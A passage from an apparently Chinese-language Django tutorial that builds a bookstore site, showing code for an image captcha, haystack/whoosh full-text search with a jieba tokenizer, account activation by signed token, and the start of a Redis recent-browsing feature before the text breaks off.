height = <span class="number">25</span></span><br><span class="line">    <span class="comment">#创建画面对象</span></span><br><span class="line">    im = Image.new(<span class="string">'RGB'</span>, (width, height), bgcolor)</span><br><span class="line">    <span class="comment">#创建画笔对象</span></span><br><span class="line">    draw = ImageDraw.Draw(im)</span><br><span class="line">    <span class="comment">#调用画笔的point()函数绘制噪点</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">        xy = (random.randrange(<span class="number">0</span>, width), random.randrange(<span class="number">0</span>, height))</span><br><span class="line">        fill = (random.randrange(<span class="number">0</span>, <span class="number">255</span>), <span class="number">255</span>, random.randrange(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">        draw.point(xy, fill=fill)</span><br><span class="line">    <span class="comment">#定义验证码的备选值</span></span><br><span class="line">    str1 = <span class="string">'ABCD123EFGHIJK456LMNOPQRS789TUVWXYZ0'</span></span><br><span class="line">    <span class="comment">#随机选取4个值作为验证码</span></span><br><span class="line">    rand_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        rand_str += str1[random.randrange(<span class="number">0</span>, len(str1))]</span><br><span class="line">    <span class="comment">#构造字体对象</span></span><br><span class="line">    font = ImageFont.truetype(os.path.join(settings.BASE_DIR, <span class="string">"Ubuntu-RI.ttf"</span>), <span class="number">15</span>)</span><br><span class="line">    <span class="comment">#构造字体颜色</span></span><br><span class="line">    fontcolor = (<span class="number">255</span>, random.randrange(<span class="number">0</span>, <span class="number">255</span>), random.randrange(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="comment">#绘制4个字</span></span><br><span class="line">    draw.text((<span class="number">5</span>, <span class="number">2</span>), rand_str[<span class="number">0</span>], font=font, fill=fontcolor)</span><br><span class="line">    draw.text((<span class="number">25</span>, <span class="number">2</span>), rand_str[<span class="number">1</span>], font=font, fill=fontcolor)</span><br><span class="line">    draw.text((<span class="number">50</span>, <span class="number">2</span>), rand_str[<span class="number">2</span>], font=font, fill=fontcolor)</span><br><span class="line">    draw.text((<span class="number">75</span>, <span class="number">2</span>), rand_str[<span class="number">3</span>], font=font, fill=fontcolor)</span><br><span class="line">    <span class="comment">#释放画笔</span></span><br><span class="line">    <span class="keyword">del</span> draw</span><br><span class="line">    <span class="comment">#存入session，用于做进一步验证</span></span><br><span class="line">    request.session[<span class="string">'verifycode'</span>] = rand_str</span><br><span class="line">    <span class="comment">#内存文件操作</span></span><br><span class="line">    <span class="keyword">import</span> io</span><br><span class="line">    buf = io.BytesIO()</span><br><span class="line">    <span class="comment">#将图片保存在内存中，文件类型为png</span></span><br><span class="line">    im.save(buf, <span class="string">'png'</span>)</span><br><span class="line">    <span class="comment">#将内存中的图片数据返回给客户端，MIME类型为图片png</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(buf.getvalue(), <span class="string">'image/png'</span>)</span><br></pre></td></tr></table></figure><p>然后在urls.py中配置url。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^verifycode/$'</span>, views.verifycode, name=<span class="string">'verifycode'</span>), <span class="comment"># 验证码功能</span></span><br></pre></td></tr></table></figure></p><p>编写前端代码。在前段代码中的Form里添加以下代码。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// templates/users/login.html</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"top: 100px; position: absolute;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"vc"</span> <span class="attr">name</span>=<span class="string">"vc"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">'verifycode'</span> <span class="attr">src</span>=<span class="string">"/user/verifycode/"</span> <span class="attr">onclick</span>=<span class="string">"this.src='/user/verifycode/?'+Math.random()"</span> <span class="attr">alt</span>=<span class="string">"CheckCode"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>前端需要向后端post数据。post以下数据<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> username = $(<span class="string">'#username'</span>).val()</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">'#pwd'</span>).val()</span><br><span class="line"><span class="keyword">var</span> csrf = $(<span class="string">'input[name="csrfmiddlewaretoken"]'</span>).val()</span><br><span class="line"><span class="keyword">var</span> remember = $(<span class="string">'input[name="remember"]'</span>).prop(<span class="string">'checked'</span>)</span><br><span class="line"><span class="keyword">var</span> vc = $(<span class="string">'input[name="vc"]'</span>).val()</span><br><span class="line"><span class="comment">// 发起ajax请求</span></span><br><span class="line"><span class="keyword">var</span> params = &#123;</span><br><span class="line">    <span class="string">'username'</span>: username,</span><br><span class="line">    <span class="string">'password'</span>: password,</span><br><span class="line">    <span class="string">'csrfmiddlewaretoken'</span>: csrf,</span><br><span class="line">    <span class="string">'remember'</span>: remember,</span><br><span class="line">    <span class="string">'verifycode'</span>: vc,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后在后端进行校验。login_check函数改为以下代码实现。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_check</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''进行用户登录校验'''</span></span><br><span class="line">    <span class="comment"># 1.获取数据</span></span><br><span class="line">    username = request.POST.get(<span class="string">'username'</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">'password'</span>)</span><br><span class="line">    remember = request.POST.get(<span class="string">'remember'</span>)</span><br><span class="line">    verifycode = request.POST.get(<span class="string">'verifycode'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.数据校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all([username, password, remember, verifycode]):</span><br><span class="line">        <span class="comment"># 有数据为空</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> verifycode.upper() != request.session[<span class="string">'verifycode'</span>]:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.进行处理:根据用户名和密码查找账户信息</span></span><br><span class="line">    passport = Passport.objects.get_one_passport(username=username, password=password)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> passport:</span><br><span class="line">        <span class="comment"># 用户名密码正确</span></span><br><span class="line">        <span class="comment"># 获取session中的url_path</span></span><br><span class="line">        <span class="comment"># if request.session.has_key('url_path'):</span></span><br><span class="line">        <span class="comment">#     next_url = request.session.get('url_path')</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     next_url = reverse('books:index')</span></span><br><span class="line">        next_url = reverse(<span class="string">'books:index'</span>) <span class="comment"># /user/</span></span><br><span class="line">        jres = JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">1</span>, <span class="string">'next_url'</span>: next_url&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断是否需要记住用户名</span></span><br><span class="line">        <span class="keyword">if</span> remember == <span class="string">'true'</span>:</span><br><span class="line">            <span class="comment"># 记住用户名</span></span><br><span class="line">            jres.set_cookie(<span class="string">'username'</span>, username, max_age=<span class="number">7</span>*<span class="number">24</span>*<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不要记住用户名</span></span><br><span class="line">            jres.delete_cookie(<span class="string">'username'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记住用户的登录状态</span></span><br><span class="line">        request.session[<span class="string">'islogin'</span>] = <span class="keyword">True</span></span><br><span class="line">        request.session[<span class="string">'username'</span>] = username</span><br><span class="line">        request.session[<span class="string">'passport_id'</span>] = passport.id</span><br><span class="line">        <span class="keyword">return</span> jres</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 用户名或密码错误</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>那我们的验证码功能就实现了。</p><h1 id="11，全文检索的实现"><a href="#11，全文检索的实现" class="headerlink" title="11，全文检索的实现"></a><a id="11">11，全文检索的实现</a></h1><p>添加全文检索应用，在配置文件中。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'haystack'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>在配置文件中写入以下配置。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 全文检索配置</span></span><br><span class="line">HAYSTACK_CONNECTIONS = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="comment"># 使用whoosh引擎</span></span><br><span class="line">        <span class="comment"># 'ENGINE': 'haystack.backends.whoosh_cn_backend.WhooshEngine',</span></span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'haystack.backends.whoosh_backend.WhooshEngine'</span>,</span><br><span class="line">        <span class="comment"># 索引文件路径</span></span><br><span class="line">        <span class="string">'PATH'</span>: os.path.join(BASE_DIR, <span class="string">'whoosh_index'</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当添加、修改、删除数据时，自动生成索引</span></span><br><span class="line">HAYSTACK_SIGNAL_PROCESSOR = <span class="string">'haystack.signals.RealtimeSignalProcessor'</span></span><br><span class="line"></span><br><span class="line">HAYSTACK_SEARCH_RESULTS_PER_PAGE = <span class="number">6</span> <span class="comment"># 指定搜索结果每页的条数</span></span><br></pre></td></tr></table></figure></p><p>在urls.py中配置。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    ...</span><br><span class="line">    url(<span class="string">r'^search/'</span>, include(<span class="string">'haystack.urls'</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>在books应用目录下建立search_indexes.py文件。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> haystack <span class="keyword">import</span> indexes</span><br><span class="line"><span class="keyword">from</span> books.models <span class="keyword">import</span> Books</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定对于某个类的某些数据建立索引, 一般类名:模型类名+Index</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BooksIndex</span><span class="params">(indexes.SearchIndex, indexes.Indexable)</span>:</span></span><br><span class="line">    <span class="comment"># 指定根据表中的哪些字段建立索引:比如:商品名字 商品描述</span></span><br><span class="line">    text = indexes.CharField(document=<span class="keyword">True</span>, use_template=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_model</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Books</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index_queryset</span><span class="params">(self, using=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.get_model().objects.all()</span><br></pre></td></tr></table></figure></p><p>在目录“templates/search/indexes/books/”下创建“books_text.txt”文件<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; object.name &#125;&#125;</span> <span class="comment"># 根据书籍的名称建立索引</span></span><br><span class="line"><span class="template-variable">&#123;&#123; object.desc &#125;&#125;</span> <span class="comment"># 根据书籍的描述建立索引</span></span><br><span class="line"><span class="template-variable">&#123;&#123; object.detail &#125;&#125;</span> <span class="comment"># 根据书籍的详情建立索引</span></span><br></pre></td></tr></table></figure></p><p>在目录“templates/search/”下建立search.html。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line">&#123;% block title %&#125;尚硅谷书城-书籍搜索结果列表&#123;% endblock title %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"breadcrumb"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; query &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>搜索结果如下:<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main_wrap clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_type_list clearfix"</span>&gt;</span></span><br><span class="line">                &#123;% for item in page %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=item.object.id %&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static item.object.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=item.object.id %&#125;"</span>&gt;</span>&#123;&#123; item.object.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"operate"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>￥&#123;&#123; item.object.price &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"unit"</span>&gt;</span>&#123;&#123; item.object.unit &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"add_books"</span> <span class="attr">title</span>=<span class="string">"加入购物车"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pagenation"</span>&gt;</span></span><br><span class="line">                &#123;% if page.has_previous %&#125;</span><br><span class="line">                    &lt;a href="/search/?q=&#123;&#123; query &#125;&#125;&amp;page=&#123;&#123; page.previous_page_number &#125;&#125;"&gt;&lt;上一页&lt;/a&gt;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">                &#123;% for pindex in paginator.page_range %&#125;</span><br><span class="line">                    &#123;% if pindex == page.number %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/search/?q=&#123;&#123; query &#125;&#125;&amp;page=&#123;&#123; pindex &#125;&#125;"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span>&#123;&#123; pindex &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    &#123;% else %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/search/?q=&#123;&#123; query &#125;&#125;&amp;page=&#123;&#123; pindex &#125;&#125;"</span>&gt;</span>&#123;&#123; pindex &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    &#123;% endif %&#125;</span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">                &#123;% if page.has_next %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/search/?q=&#123;&#123; query &#125;&#125;&amp;page=&#123;&#123; page.next_page_number &#125;&#125;"</span>&gt;</span>下一页&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock body %&#125;</span><br></pre></td></tr></table></figure></p><p>建立ChineseAnalyzer.py文件。<br>保存在haystack的安装文件夹下，路径如“/home/python/.virtualenvs/django_py2/lib/python3.5/site-packages/haystack/backends”<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="keyword">from</span> whoosh.analysis <span class="keyword">import</span> Tokenizer, Token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChineseTokenizer</span><span class="params">(Tokenizer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, value, positions=False, chars=False,</span></span></span><br><span class="line"><span class="function"><span class="params">                 keeporiginal=False, removestops=True,</span></span></span><br><span class="line"><span class="function"><span class="params">                 start_pos=<span class="number">0</span>, start_char=<span class="number">0</span>, mode=<span class="string">''</span>, **kwargs)</span>:</span></span><br><span class="line">        t = Token(positions, chars, removestops=removestops, mode=mode,</span><br><span class="line">                  **kwargs)</span><br><span class="line">        seglist = jieba.cut(value, cut_all=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> seglist:</span><br><span class="line">            t.original = t.text = w</span><br><span class="line">            t.boost = <span class="number">1.0</span></span><br><span class="line">            <span class="keyword">if</span> positions:</span><br><span class="line">                t.pos = start_pos + value.find(w)</span><br><span class="line">            <span class="keyword">if</span> chars:</span><br><span class="line">                t.startchar = start_char + value.find(w)</span><br><span class="line">                t.endchar = start_char + value.find(w) + len(w)</span><br><span class="line">            <span class="keyword">yield</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChineseAnalyzer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ChineseTokenizer()</span><br></pre></td></tr></table></figure></p><p>复制whoosh_backend.py文件，改名为whoosh_cn_backend.py<br>注意：复制出来的文件名，末尾会有一个空格，记得要删除这个空格<br>然后将下面这一行代码写入<code>whoosh_cn_backend.py</code>文件中。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .ChineseAnalyzer <span class="keyword">import</span> ChineseAnalyzer</span><br></pre></td></tr></table></figure></p><p>然后查找下面的这一行代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">analyzer=StemmingAnalyzer()</span><br></pre></td></tr></table></figure></p><p>改为<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">analyzer=ChineseAnalyzer()</span><br></pre></td></tr></table></figure></p><p>生成索引<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python manage.py rebuild_index</span><br></pre></td></tr></table></figure></p><p>在模板<code>base.html</code>中创建搜索栏<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">form</span> method=<span class="string">'get'</span> action=<span class="string">"/search/"</span> target=<span class="string">"_blank"</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">input</span> type=<span class="string">"text"</span> name=<span class="string">"q"</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">input</span> type=<span class="string">"submit"</span> value=<span class="string">"查询"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><h1 id="12，用户激活功能的实现"><a href="#12，用户激活功能的实现" class="headerlink" title="12，用户激活功能的实现"></a><a id="12">12，用户激活功能的实现</a></h1><p>首先编写视图函数：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_active</span><span class="params">(request, token)</span>:</span></span><br><span class="line">    <span class="string">'''用户账户激活'''</span></span><br><span class="line">    serializer = Serializer(settings.SECRET_KEY, <span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        info = serializer.loads(token)</span><br><span class="line">        passport_id = info[<span class="string">'confirm'</span>]</span><br><span class="line">        <span class="comment"># 进行用户激活</span></span><br><span class="line">        passport = Passport.objects.get(id=passport_id)</span><br><span class="line">        passport.is_active = <span class="keyword">True</span></span><br><span class="line">        passport.save()</span><br><span class="line">        <span class="comment"># 跳转的登录页</span></span><br><span class="line">        <span class="keyword">return</span> redirect(reverse(<span class="string">'user:login'</span>))</span><br><span class="line">    <span class="keyword">except</span> SignatureExpired:</span><br><span class="line">        <span class="comment"># 链接过期</span></span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">'激活链接已过期'</span>)</span><br></pre></td></tr></table></figure></p><p>然后配置url就完成了。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^active/(?P&lt;token&gt;.*)/$'</span>, views.register_active, name=<span class="string">'active'</span>), <span class="comment"># 用户激活</span></span><br></pre></td></tr></table></figure></p><h1 id="13，用户中心最近浏览功能的实现"><a href="#13，用户中心最近浏览功能的实现" class="headerlink" title="13，用户中心最近浏览功能的实现"></a><a id="13">13，用户中心最近浏览功能的实现</a></h1><p>最近浏览使用redis实现。重新编写books/views.py中的detail函数，每次点击商品，都将商品信息写入redis，作为最近浏览的数据。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># books/views.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detail</span><span class="params">(request, books_id)</span>:</span></span><br><span class="line">    <span class="string">'''显示商品的详情页面'''</span></span><br><span class="line">    <span class="comment"># 获取商品的详情信息</span></span><br><span class="line">    books = Books.objects.get_books_by_id(books_id=books_id)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> books <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="comment"># 商品不存在，跳转到首页</span></span><br><span class="line">        <span class="keyword">return</span> redirect(reverse(<span class="string">'books:index'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 新品推荐</span></span><br><span class="line">    books_li = Books.objects.get_books_by_type(type_id=books.type_id, limit=<span class="number">2</span>, sort=<span class="string">'new'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用户登录之后，才记录浏览记录</span></span><br><span class="line">    <span class="comment"># 每个用户浏览记录对应redis中的一条信息 格式:'history_用户id':[10,9,2,3,4]</span></span><br><span class="line">    <span class="comment"># [9, 10, 2, 3, 4]</span></span><br><span class="line">    <span class="keyword">if</span> request.session.has_key(<span class="string">'islogin'</span>):</span><br><span class="line">        <span class="comment"># 用户已登录，记录浏览记录</span></span><br><span class="line">        con = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">        key = <span class="string">'history_%d'</span> % request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">        <span class="comment"># 先从redis列表中移除books.id</span></span><br><span class="line">        con.lrem(key, 